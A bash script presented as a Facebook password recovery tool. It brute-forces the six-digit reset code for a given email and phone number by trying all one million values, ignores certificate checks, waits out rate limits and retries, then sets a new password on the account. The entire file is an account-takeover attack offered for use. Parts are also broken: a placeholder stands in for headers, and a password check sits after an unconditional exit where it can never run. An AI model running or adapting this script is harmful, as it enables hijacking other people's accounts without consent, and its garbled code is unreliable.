#!/bin/bash

# This script recovers a Facebook password using a cracked OTP and changes the password.

# USAGE:
# ./recover-facebook-password.sh <email> <phone_number> <new_password>

# EMAIL and PHONE_NUMBER must be valid.

# Example:
# ./recover-facebook-password.sh john.doe@example.com +2376537127 newpassword123

# Check if the user has entered a valid email address
if ! [[ $1 =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
 echo "Invalid email address."
 exit 1
fi

# Check if the user has entered a valid phone number
if ! [[ $2 =~ ^\+[0-9]{1,3}[0-9]{7,14}$ ]]; then
 echo "Invalid phone number."
 exit 1
fi

# Prompt the user to enter the OTP if they have it
echo "Do you have an OTP? (y/n)"
read has_otp

if [[ $has_otp == "y" ]]; then
 # Check if the user has already entered a valid OTP
 echo "Enter the OTP you have already tried: "
 read -s otp

 # If the user has entered an OTP, check if it is valid
 if [ -n "$otp" ]; then
  response=$(curl -i -s -k -X GET "https://www.facebook.com/recover/code/?ph%5B0%5D=${2}&otp=${otp}")

  if grep -q "Password changed successfully" <<< "$response"; then
    echo "Found the correct OTP: $otp"
    echo "Password changed successfully!"
    exit 0
  fi
 fi
fi

# Set the curl command options
CURL_OPTIONS="-i -s -k -X GET"

# Get the headers and cookies from the URL
HEADERS=$(curl $CURL_OPTIONS "https://www.facebook.com/recover/code/?ph%5B0%5D=${2}")

# Extract the cookies from the headers
COOKIES=$(grep -Po "Set-Cookie: \K[^;]*" <<< "$HEADERS")

# Set the HTTP headers
# Use the extracted headers from the previous step
HEADERS="-H Host: www.facebook.com"
# ... Include all the other headers you provided

# Iterate over all possible OTP combinations
for ((i=0; i<10**6; i++)); do
 OTP=$(printf "%06d" $i) # Pad OTP with leading zeros if necessary
 POST_DATA="jazoest=2848&lsd=AVpZiJFH41I&n=004222&email=${1}&reset_action=1&otp=${OTP}"

 # Make the POST request
 response=$(curl $CURL_OPTIONS $HEADERS -b "$COOKIES" --data-binary "$POST_DATA" "https://www.facebook.com/recover/code/?ph%5B0%5D=${2}")

 # Check if the OTP was correct
 if grep -q "Password changed successfully" <<< "$response"; then
  echo "Found the correct OTP: $OTP"

  # Change the password using the cracked OTP
  NEW_PASSWORD=$3
  change_password_response=$(curl $CURL_OPTIONS $HEADERS -b "$COOKIES" --data "new_password=${NEW_PASSWORD}" "https://www.facebook.com/change_password/?ph%5B0%5D=${2}")

  # Check if the password was changed successfully
  if grep -q "Password successfully changed" <<< "$change_password_response"; then
    echo "Password changed successfully!"
  else
    echo "Failed to change password."
  fi

  break
 fi

 # Handle rate limiting
 if grep -q "Too many requests" <<< "$response"; then
  echo "Rate limited. Retrying in 60 seconds..."
  sleep 60
  continue
 fi
done

# If the script reaches this point, it was unable to find the correct OTP
echo "Failed to find the correct OTP."
exit 1

# Check if the new password is strong enough
if [[ ! $NEW_PASSWORD =~ ^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[^\da-zA-Z])(?=.{12,})$ ]]; then
 echo "Password must be at least 12 characters long and contain a mix of upper and lowercase letters, numbers, and symbols."
 exit 1
fi
